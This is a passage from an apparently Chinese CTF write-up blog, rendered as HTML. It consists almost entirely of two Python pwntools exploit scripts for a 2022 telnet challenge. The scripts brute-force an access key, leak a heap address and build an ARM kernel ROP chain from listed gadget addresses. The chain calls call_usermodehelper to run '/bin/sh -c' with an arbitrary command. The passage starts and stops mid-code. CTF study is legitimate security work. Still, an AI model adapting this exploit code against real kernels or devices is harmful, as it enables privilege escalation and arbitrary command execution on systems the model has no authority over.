class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                          pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                          sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                          rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                          pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c040</span>),stack+<span class="number">4</span>*<span class="number">19</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+save_sp-<span class="number">0x24</span>),stack+<span class="number">4</span>*<span class="number">22</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8022b754</span>),stack+<span class="number">4</span>*<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8022b754 &lt;dio_complete+120&gt;    ldr    ip, [r4, #0x24]</span></span><br><span class="line"><span class="string">    0x8022b758 &lt;dio_complete+124&gt;    stm    sp, &#123;r7, ip&#125;</span></span><br><span class="line"><span class="string">    0x8022b75c &lt;dio_complete+128&gt;    blx    r1 </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€åŒ–ç‰ˆ</p>
<p>ä¹Ÿå°±ç®€åŒ–äº†20è¡ŒğŸ˜¢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span 